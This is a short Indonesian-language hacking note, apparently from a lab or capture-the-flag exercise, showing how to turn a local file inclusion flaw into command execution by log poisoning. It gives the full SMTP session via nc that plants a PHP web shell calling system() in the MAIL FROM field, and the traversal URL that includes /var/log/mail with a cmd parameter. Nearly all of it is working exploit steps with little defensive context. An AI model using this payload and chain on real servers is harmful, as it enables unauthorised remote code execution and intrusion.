# Send Test mail
Pada sebuah kasus dimana terdapat celah LFI dan kita bisa melihat email pada direktori `http://192.168.56.102/turing-bolo/bolo.php?bolo=../../../../var/log/mail`

Disini kita bisa coba upload shell dengan cara menginputkan kode shell pada **MAIL FROM** atau **DATA**
```
nc target 25
HELO hacker

MAIL FROM: "<?php if(isset($_REQUEST['cmd'])){ echo '<pre>'; $cmd = ($_REQUEST['cmd']); system($cmd); echo '</pre>'; die; }?>"

RCPT TO: admin

DATA
.


```
Terus buka URL dengan cara
```
http://192.168.56.102/turing-bolo/bolo.php?bolo=../../../../var/log/mail&cmd=id
```